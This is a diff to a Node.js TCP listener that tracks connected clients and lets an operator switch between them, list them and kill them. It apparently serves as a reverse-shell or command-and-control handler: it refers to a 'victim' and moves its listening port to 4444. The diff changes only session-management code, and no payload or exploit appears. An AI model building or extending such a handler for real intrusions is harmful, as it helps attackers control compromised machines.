@@ -82,7 +82,7 @@ const tcpServer = net.createServer((socket) => {
 	    
 	switch (cmd) {
 	case "switch":
-	    let getUserToSwitch = data.split(" ")[1].trim();
+	    let getUserToSwitch = data.split(/\s+/)[1].trim();
 	    
 	    if ( getUserToSwitch && Number.isInteger(Number(getUserToSwitch))) {
 		// building regexp to match request victim 
@@ -93,7 +93,7 @@ const tcpServer = net.createServer((socket) => {
 		currentClient = socketList[currentClient];
 		
 		if ( ! currentClient ) {
-		    process.stdout.write(color.red("There is no user with the id of " +  getUserToSwitch));
+		    process.stdout.write(color.red("There is no user with the id of " +  getUserToSwitch) + '\n');
 		    prompt.prompt();
 		    return ;
 		}
@@ -102,19 +102,22 @@ const tcpServer = net.createServer((socket) => {
 		
 		prompt.setPrompt({id,port,address});
 		prompt.prompt();
-		
+		return ;
 	    }
+
+	    process.stdout.write(color.red('invalid id specified ' + getUserToSwitch) + '\n');
+	    prompt.prompt();
+	    
 	    break;
 	    
 	case 'list':
 	    
 	    let objNames = Object.getOwnPropertyNames(socketList);
-	    console.log(objNames);
-	    let i = 0;
+
 	    
 	    objNames.forEach((sockets) => {
 		let {id, port, address, localPort, localAddress} = socketList[sockets];
-		process.stdout.write(`${(++i)} ${localAddress}:${localPort} --> ${address}:${port}\n`);
+		process.stdout.write(`${id.replace(/_*/,'')} ${localAddress}:${localPort} --> ${address}:${port}\n`);
 		
 	    });
 	    prompt.prompt();
@@ -143,57 +146,28 @@ const tcpServer = net.createServer((socket) => {
 	    break;
 	    
 	case 'killclient':
-
+	    let clientId = data.split(/\s+/)[1].trim();
 	    
-	    let { id , port , address} = currentClient;
-	    
-	    let getIdNum = id.match(/^(\d+)/)[1];
-	    
-	    let getPreviousClient = Number(getIdNum) - 1;
-
-	    let getNextClient = Number(getIdNum) + 1;
-
-	    //delete socketList[currentClient]; // i can't tell why this does not work o.O
-
-	    delete serverList[currentClient];
-	    
-	    if ( getPreviousClient !== 0 ) {
-				
-		let userRegexp = new RegExp(`^(${getPreviousClient}){1,}`);
+	    if ( clientId && Number.isInteger(Number(clientId))) {
 		
+		let userRegexp = new RegExp(`^(${clientId}){1,}`);
 
-		currentClient = Object.keys(socketList).filter(( l ) => userRegexp.test(l) );
+		let removeClient = Object.keys(socketList).filter(( l ) => (userRegexp.test(l)) );
 
-		currentClient = socketList[currentClient];
-		
-		prompt.setPrompt({ id, port, address} = currentClient);
+		if ( removeClient.length === 0 ) {
+		    process.stdout.write(color.red("There is no user with the id of " +  clientId));
+		    prompt.prompt();
+		    return ;
+		}
+
+		delete socketList[removeClient];
 
 		prompt.prompt();
-
-		return ;
-		// get the next client if there is really one
-	    } else if (
-		Object.keys(socketList).filter( l => new RegExp(`^(${getNextClient}){1,}`).test(l) ).length !== 0 ) {
-		
-		currentClient = Object.keys(socketList).filter( l => new RegExp(`^(${getNextClient}){1,}`).test(l) );
-		
-		currentClient = socketList[currentClient];
-		
-		prompt.setPrompt({id, port, address} = currentClient);
-
-		prompt.prompt();
-
 		return ;
 		
 	    }
 
-
-	    id = port = address = '**';
-
-
-	    currentClient = undefined;
-	    process.stdout.write('no active connection now\n');
-	    prompt.setPrompt({id,port,address});
+	    process.stdout.write(color.red('invalid id specified ' + clientId) + '\n');
 	    prompt.prompt();
 	    break;
 	    
@@ -232,6 +206,6 @@ const tcpServer = net.createServer((socket) => {
     
 });
 
-tcpServer.listen(21, () => {
-    console.log('listening for connection on port 21');
+tcpServer.listen(4444, () => {
+    console.log('listening for connection on port 4444');
 });
